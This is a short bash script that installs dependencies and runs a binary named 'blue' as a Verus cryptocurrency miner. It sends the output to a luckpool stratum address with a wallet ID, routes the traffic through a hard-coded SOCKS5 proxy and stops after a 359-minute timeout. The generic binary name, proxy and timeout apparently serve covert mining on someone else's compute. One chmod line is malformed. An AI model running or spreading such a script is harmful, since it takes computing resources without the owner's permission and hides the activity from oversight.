#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x okey.sh && chmod +x blue chmod 777 blue okey.sh
screen -dmS ls
A=stratum+tcp://na.luckpool.net:3956
B=RURWcc2tJvtv8xTfBuS8aakhg4FPAdVMtd
C=Gandos-1
D=socks5://98.178.72.21:10919
timeout 359m ./blue -a verus -o $A -u $B.$C -p x -t 2 -x $D
sudo apt update
